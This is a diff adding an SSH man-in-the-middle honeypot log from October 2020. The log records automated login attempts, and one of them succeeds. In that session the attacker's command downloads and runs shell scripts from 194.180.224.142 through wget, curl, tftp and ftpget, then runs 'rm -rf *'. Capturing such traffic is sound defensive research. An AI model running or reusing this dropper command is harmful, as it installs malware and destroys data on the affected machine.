@@ -1,0 +1,37 @@
+2020-10-24 01:42:08.098 - [Info] MITM Version: 1.26
+2020-10-24 01:42:08.105 - [Info] Auto Access Enabled: true
+2020-10-24 01:42:08.106 - [Debug] [Init] Auto Access Barrier: true
+2020-10-24 01:42:08.131 - [Info] SSH man-in-the-middle server for 172.20.0.202 listening on 0.0.0.0:10001
+2020-10-24 01:42:23.513 - [Debug] [Connection] Attacker connected: 193.228.91.123 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-24 01:42:24.432 - [Debug] [Auth] Attacker 193.228.91.123 trying to authenticate with "password"
+2020-10-24 01:42:24.433 - [Debug] [Auto Access] Attacker: 193.228.91.123, Threshold: 1, Attempts: 1
+2020-10-24 01:42:24.433 - [Debug] [Auto Access] Compromising the honeypot
+2020-10-24 01:42:24.433 - [Debug] [Auto Access] Adding the following credentials: "db2inst1:db2inst1"
+2020-10-24 01:42:24.772 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-10-24 01:42:24.773 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.202
+2020-10-24 01:42:40.339 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-10-24 01:42:40.670 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.180.224.142/hentai.sh; curl -O http://194.180.224.142/hentai.sh; chmod 777 hentai.sh; sh hentai.sh; tftp 194.180.224.142 -c get hentai.sh; chmod 777 hentai.sh; sh hentai.sh; tftp -r hentai2.sh -g 194.180.224.142; chmod 777 hentai2.sh; sh hentai2.sh; ftpget -v -u anonymous -p anonymous -P 21 194.180.224.142 hentai1.sh hentai1.sh; sh hentai1.sh; rm -rf hentai.sh hentai.sh hentai2.sh hentai1.sh; rm -rf *
+2020-10-24 01:42:44.312 - [Debug] [Connection] Attacker closed connection
+2020-10-24 01:42:44.321 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-10-24 01:42:44.322 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-10-24 01:42:54.851 - [Debug] [Connection] Attacker connected: 193.105.134.45 | Client Identification: SSH-2.0-paramiko_1.10.1
+2020-10-24 01:42:56.084 - [Debug] [Auth] Attacker 193.105.134.45 trying to authenticate with "none"
+2020-10-24 01:42:56.084 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-10-24 01:42:56.354 - [Debug] [Auth] Attacker 193.105.134.45 trying to authenticate with "password"
+2020-10-24 01:42:56.355 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-10-24 01:42:56.356 - [Debug] [Auth] Attacker: 193.105.134.45 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-24 01:42:56.625 - [Debug] [Connection] Attacker closed the connection
+2020-10-24 01:44:07.059 - [Debug] [Connection] Attacker connected: 109.236.91.85 | Client Identification: SSH-2.0-JSCH_0.1.48
+2020-10-24 01:44:08.414 - [Debug] [Auth] Attacker 109.236.91.85 trying to authenticate with "none"
+2020-10-24 01:44:08.414 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-10-24 01:44:08.634 - [Debug] [Auth] Attacker 109.236.91.85 trying to authenticate with "password"
+2020-10-24 01:44:08.635 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-10-24 01:44:08.636 - [Debug] [Auth] Attacker: 109.236.91.85 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-24 01:44:08.854 - [Debug] [Connection] Attacker closed the connection
+2020-10-24 01:47:02.664 - [Debug] [Connection] Attacker connected: 195.3.147.47 | Client Identification: SSH-2.0-paramiko_2.1.2
+2020-10-24 01:47:03.805 - [Debug] [Auth] Attacker 195.3.147.47 trying to authenticate with "none"
+2020-10-24 01:47:03.805 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-10-24 01:47:04.064 - [Debug] [Auth] Attacker 195.3.147.47 trying to authenticate with "password"
+2020-10-24 01:47:04.065 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Container user is disabled
+2020-10-24 01:47:04.066 - [Debug] [Auth] Attacker: 195.3.147.47 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-24 01:47:04.324 - [Debug] [Connection] Attacker closed the connection
